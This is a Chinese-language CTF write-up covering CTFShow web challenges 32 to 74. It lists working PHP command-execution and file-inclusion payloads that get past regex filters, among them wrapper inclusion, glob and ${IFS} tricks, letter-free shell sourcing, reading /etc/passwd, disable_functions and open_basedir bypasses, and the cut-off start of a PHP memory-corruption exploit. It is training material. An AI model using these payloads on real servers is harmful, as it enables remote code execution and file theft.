<h2 id="web32-36"><a href="#web32-36" class="headerlink" title="web32-36"></a>web32-36</h2><p><code>if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c))</code><br>payload:<br><code>?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
<h2 id="web37-39"><a href="#web37-39" class="headerlink" title="web37/39"></a>web37/39</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">if(!preg_match("/flag/i", $c)){
    include($c);
    echo $flag;
}
if(!preg_match("/flag/i", $c)){
    include($c.".php");
}
//?c=data://text/plain,<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'cat f*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>
//39 output：$flag="flag{8262a004-69e7-460b-b412-05d4178c08f8}";.php
//39 data://text/plain, 这样就相当于执行了php语句 .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么 作用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/flag|php|file/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">//过滤了php和file</span>
<span class="token comment">//?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZionKTs/Pg==</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>这题跟<a href="https://yq1ng.github.io/z_post/BUUOJ-[GXYCTF2019]-WEB-WP/#%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83">GXYCTF2019的禁止套娃</a>很像，参考一下<br>在看一个利用session的<del>题解</del><br><code>?c=session_start();system(session_id());</code><br>在session处添加一条记录：<code>PHPSESSID:ls</code>，可以列出文件，再改成<code>c=session_start();highlight_file(session_id());</code>，flag读不出来。。凉</p>
<blockquote>
<p>引自<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/108415301">羽大佬博客</a><br>经过测试发现，受php版本影响 5.5 -7.1.9均可以执行，因为session_id规定为0-9，a-z,A-Z,-中的字符。在5.5以下及7.1以上均无法写入除此之外的内容。但是符合要求的字符还是可以的</p>
</blockquote>
<h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/108569080">web41</a></h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i'</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"echo(<span class="token interpolation"><span class="token variable">$c</span></span>);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>exp已经保存了，哈哈</p>
<h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><p><code>system($c." &gt;/dev/null 2&gt;&amp;1");</code><br>详解：<a target="_blank" rel="noopener" href="https://blog.csdn.net/ithomer/article/details/9288353">https://blog.csdn.net/ithomer/article/details/9288353</a></p>
<blockquote>
<p><code>/dev/null</code> ：代表空设备文件<br><code>&gt;</code>  ：代表重定向到哪里，例如：echo “123” &gt; /home/123.txt<br><code>1</code>  ：表示stdout标准输出，系统默认值是1，所以”&gt;/dev/null”等同于”1&gt;/dev/null”<br><code>2</code>  ：表示stderr标准错误<br><code>&amp;</code>  ：表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1\</p>
</blockquote>
<p><code>1 &gt; /dev/null 2&gt;&amp;1 </code>语句含义：<br><code>1 &gt; /dev/null</code> ： 首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，说白了就是不显示任何信息。<br><code>2&gt;&amp;1</code> ：接着，标准错误输出重定向（等同于）标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。<br>payload：<code>?c=cat flag*%0a</code>，<code>%0a</code>进行换行</p>
<h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>往上payload：<code>?c=nl${IFS}fla%27%27g.php%0a</code>通杀</p>
<h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>payload：<code>?c=/bin/?at${IFS}f???????</code><br>cat什么的被过滤了就要从bin下再把它引出来</p>
<h2 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">// 你们在炫技吗？</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>Lazzaro师傅真狠啊，字母全凉了，不过羽师傅提供了一个<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/108555433">骚思路</a>，真是活久见。。</p>
<ol>
<li>payload：<code>?c=/???/????64 ????.???</code> –&gt;  <code>/bin/base64 flag.php</code></li>
<li>通过该命令压缩flag.php 然后进行下载<br> payload：<code>?c=/???/???/????2 ????.???</code><br> 也就是<code>/usr/bin/bzip2 flag.php</code><br> 然后访问<code>/flag.php.bz2</code>进行下载获得<code>flag.php</code></li>
</ol>
<h2 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>和上题类似，过滤内容变了，这次数字也不能用了，附上<a href="leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">P牛博客</a>和<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/108513145">Firebasky师傅博客</a>还有<a target="_blank" rel="noopener" href="https://www.gem-love.com/websecurity/1407.html">Y1ng师傅</a><br>linux中<code>.</code>相当于<code>source</code>可以执行sh命令，且无需执行权限，<a target="_blank" rel="noopener" href="http://blog.sina.com.cn/s/blog_af68a2c201016nh2.html">具体介绍点此</a>\</p>
<ol>
<li>构造上传页面 <pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>POST数据包POC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://45e8c3c6-fd54-4110-a17f-3dff9f3e68a2.chall.ctf.show/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!--链接是当前打开的题目链接--&gt;</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>文件名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li>抓包，构造poc命令执行<br>发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母，看一下ASCII表，可以发现大写字母在<code>@</code>和<code>[</code>之间，而Linux的glob通配符支持利用<code>[0-9]</code>来表示一个范围，那么就可以用<code>[@-[]</code>来表示大写字母<br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.png" alt="ASCII"></li>
</ol>
<p>然后传文件，并添加sh命令，有时候并不会执行成功，因为最后一位不一定一直是大写字母，多试几次<br><code>/?c=.%20/???/????????[@-[]</code></p>
<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">#!/bin/sh
ls<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.xqklo38zuce.png" alt="result_ls"></p>
<p>接着读取flag即可</p>
<h2 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">// 还能炫的动吗？</span>
<span class="token comment">//flag in 36.php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"cat "</span><span class="token punctuation">.</span><span class="token variable">$c</span><span class="token punctuation">.</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>不懂，上payload：<code>$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</code></p>
<p><img src="https://img-blog.csdnimg.cn/20201105182344281.png#pic_center"><br>输出36</p>
<blockquote>
<p>原理<br><code>${_} ="" </code> //返回上一次命令<br><code>$((${_}))=0</code><br><code>$((~$((${_}))))=-1</code><br>然后拼接出-36在进行取反</p>
</blockquote>
<p>多学一招</p>
<h2 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h2><p>常用函数被ban了，system，shell_exec什么的，直接上蚁剑就行嘿嘿嘿，看看php.ini禁了那些函数</p>
<pre class="line-numbers language-ini" data-language="ini"><code class="language-ini"><span class="token constant">disable_functions</span> <span class="token attr-value"><span class="token punctuation">=</span>phpinfo,apache_child_terminate,apache_setenv,chgrp,chmod,chown,curl_exec,curl_multi_exec,dl,exec,imap_mail,imap_open,ini_alter,ini_restore,ini_set,link,mail,openlog,parse_ini_file,passthru,pcntl_alarm,pcntl_exec,pcntl_fork,pcntl_setpriority,pcntl_signal,pcntl_signal_dispatch,pcntl_sigprocmask,pcntl_sigtimedwait,pcntl_sigwaitinfo,pcntl_wait,pcntl_waitpid,pcntl_wstopsig,pcntl_wtermsig,popen,posix_kill,proc_get_status,proc_open,proc_terminate,putenv,readlink,shell_exec,symlink,syslog,system</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="web61-67"><a href="#web61-67" class="headerlink" title="web61-67"></a>web61-67</h2><p>使用蚁剑的插件绕过</p>
<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.wrue5gy37s.png" alt="disfun"></p>
<h2 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h2><p>蚁剑失败了</p>
<p><code>c=var_dump(scandir("/"));</code></p>
<p><code>c=var_dump(highlight_file('/flag.txt'));</code></p>
<h2 id="web68-70"><a href="#web68-70" class="headerlink" title="web68-70"></a>web68-70</h2><p><code>c=var_export(scandir("/"));</code></p>
<p><code>c=include('/flag.txt');</code></p>
<h2 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">//@Author: Lazzaro</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'display_errors'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 你们在炫技吗？</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/[0-9]|[a-z]/i"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"?"</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><del>没见过这样的</del>，payload：<code>c=include('/flag.txt');exit();</code><br>如果不用<code>exit();</code>的话，数字和字母会被替换为<code>???</code></p>
<h2 id="web72-73-74"><a href="#web72-73-74" class="headerlink" title="web72 | 73 | 74"></a>web72 | 73 | 74</h2><p>代码和上一题一样，不过做了<code>open_basedir</code>限制，flag也和上一题不一样了。通过包含<code>/etc/passwd</code>可以看出来，pl：<code>c=include('/etc/passwd');exit();</code></p>
<p><a target="_blank" rel="noopener" href="https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/">open_basedir绕过</a></p>
<p>列目录</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"glob:///*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'&lt;br&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>用<a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">mm0r1师傅</a>的绕过脚本读取文件失败了，看了<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/108670155">Firebasky师傅</a>的博客偷了一个群主的脚本嘿嘿，脚本需要urlencode使用</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token keyword">function</span> <span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">,</span> <span class="token variable">$backtrace</span><span class="token punctuation">;</span>

    <span class="token keyword">class</span> <span class="token class-name">Vuln</span> <span class="token punctuation">{</span>
        <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">global</span> <span class="token variable">$backtrace</span><span class="token punctuation">;</span>
            <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">getTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token function">debug_backtrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">class</span> <span class="token class-name">Helper</span> <span class="token punctuation">{</span>
        <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token variable">$d</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$s</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$address</span> <span class="token operator">&lt;</span><span class="token operator">&lt;=</span> <span class="token number">8</span><span class="token punctuation">;</span>
            <span class="token variable">$address</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token variable">$address</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">ptr2str</span><span class="token punctuation">(</span><span class="token variable">$ptr</span><span class="token punctuation">,</span> <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>
